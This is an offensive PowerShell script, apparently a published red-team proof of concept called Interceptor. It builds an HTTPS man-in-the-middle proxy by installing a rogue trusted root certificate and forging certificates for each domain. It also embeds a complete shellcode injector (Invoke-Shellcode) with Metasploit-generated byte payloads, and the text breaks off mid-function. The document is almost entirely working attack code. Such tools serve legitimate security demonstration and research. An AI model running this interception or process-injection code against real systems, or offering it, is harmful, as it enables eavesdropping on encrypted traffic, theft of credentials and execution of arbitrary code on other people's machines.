<#
.SYNOPSIS

This script demonstrates the ability to capture and tamper with Web sessions.  
For secure sessions, this is done by dynamically writing certificates to match the requested domain. 
This is only proof-of-concept, and should be used cautiously, to demonstrate the effects of such an attack. 

Function: Interceptor
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 3.0.0
Release Date: 


.DESCRIPTION

This script sets up an HTTP(s) proxy server on a configurable port.  
It will write the request headers and response headers to output.  This can be changed.

.PARAMETER ListenPort

Configurable Port to listen for incoming Web requests.  The Default is 8081

.PARAMETER ProxyServer

In many environments it will be necessary to chain HTTP(s) requests upstream to another proxy server.  
Default behavior expects no upstream proxy.

.PARAMETER ProxyPort

In many environments it will be necessary to chain HTTP(s) requests upstream to another proxy server.  
This sets the Port for the upstream proxy

.PARAMETER Tamper

Sometimes replaces "Cyber" with "Kitten"

.PARAMETER HostCA

This allows remote devices to connect and install the Interceptor Root Certificate Authority
From the remote/mobile device browse to http://[InterceptorIP]:8082/i.cer
example: http://192.168.1.1:8082/i.cer

.PARAMETER Cleanup

Removes any installed certificates and exits.


.EXAMPLE

Interceptor.ps1 -ProxyServer localhost -ProxyPort 8888 
Interceptor.ps1 -Tamper 
Interceptor.ps1 -HostCA

.NOTES
This script attempts to make SSL MITM accessible, by being a small compact proof of concept script.  
It can be used to demonstrate the effects of malicious software. 
This script requires that you manually change your Browser Proxy Settings to direct traffic to Interceptor. 
It will install Certificates in your Trusted Root Store.  Use at your own risk :)

.LINK

Github repo: https://github.com/subTee/Interceptor

#>
[CmdletBinding()]
Param(
  [Parameter(Mandatory=$False,Position=0)]
  [int]$ListenPort,
  
  [Parameter(Mandatory=$False,Position=1)]
  [string]$ProxyServer,
  
  [Parameter(Mandatory=$False,Position=2)]
  [int]$ProxyPort,
  
  [Parameter(Mandatory=$False,Position=3)]
  [switch]$Tamper,
  
  [Parameter(Mandatory=$False,Position=4)]
  [switch]$HostCA,
  
  [Parameter(Mandatory=$False,Position=6)]
  [switch]$Cleanup
)



function Start-CertificateAuthority()
{
	#Thanks to @obscuresec for this Web Host
	#Pulls CA Certificate from Store and Writes Directly back to Mobile Device
	# example: http://localhost:8082/i.cer
	Start-Job -ScriptBlock {
			
			$Hso = New-Object Net.HttpListener
			$Hso.Prefixes.Add("http://+:8082/")
			$Hso.Start()
			While ($Hso.IsListening) {
				$HC = $Hso.GetContext()
				$HRes = $HC.Response
				$HRes.Headers.Add("Content-Type","text/plain")
				$cert = Get-ChildItem cert:\CurrentUser\Root | where { $_.Issuer -match "__Interceptor_Trusted_Root" }
				$type = [System.Security.Cryptography.X509Certificates.X509ContentType]::cert
				$Buf = $cert.Export($type)
				$HRes.OutputStream.Write($Buf,0,$Buf.Length)
				$HRes.Close()
			}
				
			}
	
	
	
}

function Invoke-RemoveCertificates([string] $issuedBy)
{
	$certs = Get-ChildItem cert:\CurrentUser\My | where { $_.Issuer -match $issuedBy }
	if($certs)
	{
		foreach ($cert in $certs) 
		{
			$store = Get-Item $cert.PSParentPath
			$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::MaxAllowed)
			$store.Remove($cert)
			$store.Close()
		}
	}
	#Remove Any Trusted Root Certificates
	$certs = Get-ChildItem cert:\CurrentUser\Root | where { $_.Issuer -match $issuedBy }
	if($certs)
	{
	foreach ($cert in $certs) 
		{
			$store = Get-Item $cert.PSParentPath
			$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::MaxAllowed)
			$store.Remove($cert)
			$store.Close()
		}
	}
	[Console]::WriteLine("Certificates Removed")
		
}

function Invoke-Shellcode
{
<#
.SYNOPSIS

Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.

PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre

PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):

msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 

Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
 
.PARAMETER ProcessID

Process ID of the process you want to inject shellcode into.

.PARAMETER Shellcode

Specifies an optional shellcode passed in as a byte array

.PARAMETER Force

Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.

.EXAMPLE

C:\PS> Invoke-Shellcode -ProcessId 4274

Description
-----------
Inject shellcode into process ID 4274.

.EXAMPLE

C:\PS> Invoke-Shellcode

Description
-----------
Inject shellcode into the running instance of PowerShell.

.EXAMPLE

C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
    
Description
-----------
Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
#>

[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProcessID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Ensure a valid process ID was provided
        # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        #$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
		$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $CallStub = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  RAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  RAX
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  EAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  EAX
        }
        
        Write-Output $CallStub
    }

    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        # Open a handle to the process you want to inject into
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
        
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }

        $IsWow64 = $false

        if ($64bitOS) # Only perform theses checks if CPU is 64-bit
        {
            # Determine if the process specified is 32 or 64 bit
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) # 32-bit Wow64 process
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                }
                
                $Shellcode = $Shellcode32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else # 64-bit process
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                }
                
                $Shellcode = $Shellcode64
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else # 32-bit CPU
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }

        # Reserve and commit enough memory in remote process to hold the shellcode
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode into the previously allocated memory
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate inline assembly stub
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Write 32-bit assembly stub to remote process memory space
        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

        # Execute shellcode as a remote thread
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProcessID"
        }

        # Close process handle
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Shellcode injection complete!'
    }

    function Local:Inject-LocalShellcode
    {
        if ($PowerShell32bit) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                return
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                return
            }
            
            $Shellcode = $Shellcode64
            Write-Verbose 'Using 64-bit shellcode.'
        }
    
        # Allocate RWX memory for the shellcode
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$BaseAddress)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
        
        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
        
        if ($PowerShell32bit)
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate RWX memory for the thread call stub
        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$CallStubAddress)
        {
            Throw "Unable to allocate thread call stub."
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy call stub to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

        # Launch shellcode in it's own thread
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        # Wait for shellcode thread to terminate
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

        Write-Verbose 'Shellcode injection complete!'
    }

    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    $AddressWidth = $null

    try {
        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
    } catch {
        throw 'Unable to determine OS processor address width.'
    }

    switch ($AddressWidth) {
        '32' {
            $64bitOS = $False
        }

        '64' {
            $64bitOS = $True

            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        }

        default {
            throw 'Invalid OS address width detected.'
        }
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PSBoundParameters['Shellcode'])
    {
        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
        [Byte[]] $Shellcode32 = $Shellcode
        [Byte[]] $Shellcode64 = $Shellcode32
    }
    else
    {
        # Pop a calc... or whatever shellcode you decide to place in here
        # I sincerely hope you trust that this shellcode actually pops a calc...
        # Insert your shellcode here in the for 0xXX,0xXX,...
        # 32-bit payload
        # msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
        [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                  0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                  0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
                                  0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,
                                  0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,
                                  0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
                                  0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,
                                  0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,
                                  0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                  0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                  0x61,0x6c,0x63,0x00)

        # 64-bit payload
        # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
        [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                  0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                  0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                                  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                                  0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                                  0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                                  0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                                  0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                  0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                                  0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                                  0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                                  0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                  0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Inject shellcode into the specified process ID
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
        Write-Verbose "Injecting shellcode into PID: $ProcessId"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
        {
            Inject-RemoteShellcode $ProcessId
        }
    }
    else
    {
        # Inject shellcode into the currently running PowerShell process
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        
        Write-Verbose "Injecting shellcode into PowerShell"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode into the running PowerShell process!" ) )
        {
            Inject-LocalShellcode
        }
    }   
}

function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
{
	$CAsubject = $certSubject
	$dn = new-object -com "X509Enrollment.CX500DistinguishedName"
	$dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
	#Issuer Property for cleanup
	$issuer = "__Interceptor_Trusted_Root"
	$issuerdn = new-object -com "X509Enrollment.CX500DistinguishedName"
	$issuerdn.Encode("CN=" + $issuer, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
	#Subject Alternative Name
	$objRfc822Name = new-object -com "X509Enrollment.CAlternativeName";
	$objAlternativeNames = new-object -com "X509Enrollment.CAlternativeNames";
	$objExtensionAlternativeNames = new-object -com "X509Enrollment.CX509ExtensionAlternativeNames";
	
	#Set Alternative RFC822 Name 
	$objRfc822Name.InitializeFromString(3, $certSubject); #https://msdn.microsoft.com/en-us/library/windows/desktop/aa374830(v=vs.85).aspx
	
	#Set Alternative Names 
	$objAlternativeNames.Add($objRfc822Name);
	$objExtensionAlternativeNames.InitializeEncode($objAlternativeNames);
	
	# Create a new Private Key
	$key = new-object -com "X509Enrollment.CX509PrivateKey"
	$key.ProviderName =  "Microsoft Enhanced RSA and AES Cryptographic Provider" #"Microsoft Enhanced Cryptographic Provider v1.0"
	$key.ExportPolicy = 2; #Mark As Exportable
	
	# Set CAcert to 1 to be used for Signature
	if($isCA)
		{
			$key.KeySpec = 2 
		}
	else
		{
			$key.KeySpec = 1
		}
	$key.Length = 1024
	$key.MachineContext = $false # 1 For Machine 0 For User
	$key.Create() 
	
	
	 
	# Create Attributes
	$serverauthoid = new-object -com "X509Enrollment.CObjectId"
	$serverauthoid.InitializeFromValue("1.3.6.1.5.5.7.3.1")
	$ekuoids = new-object -com "X509Enrollment.CObjectIds.1"
	$ekuoids.add($serverauthoid)
	$ekuext = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
	$ekuext.InitializeEncode($ekuoids)

	$cert = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
	$cert.InitializeFromPrivateKey(1, $key, "")
	$cert.Subject = $dn
	$cert.Issuer = $issuerdn
	$cert.NotBefore = (get-date).AddDays(-1) #Backup One day to Avoid Timing Issues
	$cert.NotAfter = $cert.NotBefore.AddDays(90) #Arbitrary... Change to persist longer...
	#Use Sha256
	$hashAlgorithmObject = New-Object -ComObject X509Enrollment.CObjectId
	$hashAlgorithmObject.InitializeFromAlgorithmName(1,0,0,"SHA256")
	$cert.HashAlgorithm = $hashAlgorithmObject
	#Good Reference Here http://www.css-security.com/blog/creating-a-self-signed-ssl-certificate-using-powershell/
	
	$cert.X509Extensions.Add($ekuext)
	$cert.X509Extensions.Add($objExtensionAlternativeNames);
	if ($isCA)
	{
		$basicConst = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
		$basicConst.InitializeEncode("true", 1)
		$cert.X509Extensions.Add($basicConst)
	}
	else
	{              
		$signer = (Get-ChildItem Cert:\CurrentUser\Root | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root" })
		$signerCertificate =  new-object -com "X509Enrollment.CSignerCertificate"
		$signerCertificate.Initialize(0,0,4, $signer.Thumbprint)
		$cert.SignerCertificate = $signerCertificate
	}
	$cert.Encode()

	$enrollment = new-object -com "X509Enrollment.CX509Enrollment"
	$enrollment.InitializeFromRequest($cert)
	$certdata = $enrollment.CreateRequest(0)
	$enrollment.InstallResponse(2, $certdata, 0, "")

	if($isCA)
	{              
									
		# Need a Better way to do this...
		$CACertificate = (Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root" })
		# Install CA Root Certificate
		$StoreScope = "CurrentUser"
		$StoreName = "Root"
		$store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
